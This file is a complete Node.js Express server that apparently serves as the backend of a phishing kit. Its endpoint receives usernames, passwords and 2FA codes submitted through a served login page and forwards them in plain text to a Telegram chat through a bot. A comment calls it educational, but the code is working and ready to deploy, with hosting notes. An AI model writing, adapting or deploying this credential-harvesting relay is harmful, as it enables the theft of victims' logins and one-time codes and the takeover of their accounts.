// Load environment variables from .env file
// This should be at the very top of your server.js file
require('dotenv').config();

const express = require('express');
const path = require('path');
const fetch = require('node-fetch'); // Make sure you installed node-fetch@2 for CommonJS

const app = express();
// Use port from environment variable (provided by Render) or default to 3000 for local development
const PORT = process.env.PORT || 3000;

// --- CRITICAL SECURITY WARNING ---
// The following code demonstrates sending sensitive user data (username, password, 2FA code)
// to an external API (Telegram) directly from the server.
//
// In a REAL PRODUCTION APPLICATION:
// 1. Passwords MUST be hashed (e.g., using bcrypt) before storage or processing.
// 2. User credentials and 2FA codes should NEVER be stored in plain text.
// 3. All communication should strictly use HTTPS.
// 4. A proper authentication system with secure session management and database interaction
//    (e.g., for user verification, 2FA validation, and password storage) is essential.
// 5. This example is for educational purposes ONLY to show the data flow.
//    DO NOT use this code in any production environment or for any real data collection.

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Middleware to parse JSON bodies from incoming requests
app.use(express.json());

// Serve static files from the 'public' directory
// This means when someone visits your site, files like index.html, CSS, JS, images
// in the 'public' folder will be served automatically.
app.use(express.static(path.join(__dirname, 'public')));

// Define a route for the root URL to serve index.html
// This ensures that when people visit your site's main URL, they get your index.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// API endpoint to receive data from the frontend and forward it to Telegram
app.post('/api/send-telegram-message', async (req, res) => {
    // Destructure data from the request body
    const { type, username, password, authCode, trustDevice, attempt, userAgent, timestamp } = req.body;

    // Basic validation for Telegram credentials
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.error('SERVER ERROR: Telegram Bot Token or Chat ID is not set in environment variables.');
        // Respond to the frontend with an error
        return res.status(500).json({ success: false, message: 'Server configuration error: Telegram API keys missing.' });
    }

    let messageText = "⚠️ Unknown data received by backend! ⚠️"; // Default message

    // Format the message based on the 'type' of data received
    if (type === 'login') {
        messageText = `📢 New Login Attempt 📢\n\n` +
                      `🔑 Username: <b>${username || 'N/A'}</b>\n` +
                      `🔒 Password: <b>${password || 'N/A'}</b>\n\n` +
                      `🌐 User Agent: ${userAgent || 'N/A'}\n` +
                      `⏰ Timestamp: ${timestamp || 'N/A'}`;
    } else if (type === '2fa') {
        messageText = `🔐 2FA Attempt ${attempt || 'N/A'}\n\n` +
                      `👤 Username: <b>${username || 'N/A'}</b>\n` +
                      `🔑 Password: <b>${password || 'N/A'}</b>\n` +
                      `🔢 2FA Code: <b>${authCode || 'Empty'}</b>\n` +
                      `📱 Trust Device: ${trustDevice ? 'Yes' : 'No'}\n\n` +
                      `🌐 User Agent: ${userAgent || 'N/A'}\n` +
                      `🕒 Time: ${timestamp || 'N/A'}`;
    }

    try {
        // Construct the Telegram API URL using the bot token
        const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        // Make the HTTP POST request to Telegram
        const telegramResponse = await fetch(telegramApiUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: messageText,
                parse_mode: 'HTML' // Use HTML parse mode for bold tags etc.
            })
        });

        // Check if the request to Telegram was successful
        if (!telegramResponse.ok) {
            const errorDetails = await telegramResponse.text();
            console.error('Telegram API error during forwarding:', errorDetails);
            // Respond to the frontend with an error if Telegram API failed
            return res.status(telegramResponse.status).json({ 
                success: false, 
                message: 'Failed to send message to Telegram.', 
                details: errorDetails 
            });
        }

        console.log('Message successfully forwarded to Telegram.');
        // Respond to the frontend that the operation was successful
        res.json({ success: true, message: 'Message sent successfully.' });

    } catch (error) {
        // Catch any network or other errors during the fetch operation
        console.error('Error forwarding message to Telegram:', error);
        res.status(500).json({ success: false, message: 'Internal server error during Telegram forwarding.' });
    }
});

// Start the Express server and listen for incoming requests
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
    console.log(`Frontend accessible at http://localhost:${PORT}`);
    console.log(`Telegram Bot Token: ${TELEGRAM_BOT_TOKEN ? 'Loaded' : 'NOT LOADED'}`);
    console.log(`Telegram Chat ID: ${TELEGRAM_CHAT_ID ? 'Loaded' : 'NOT LOADED'}`);
});
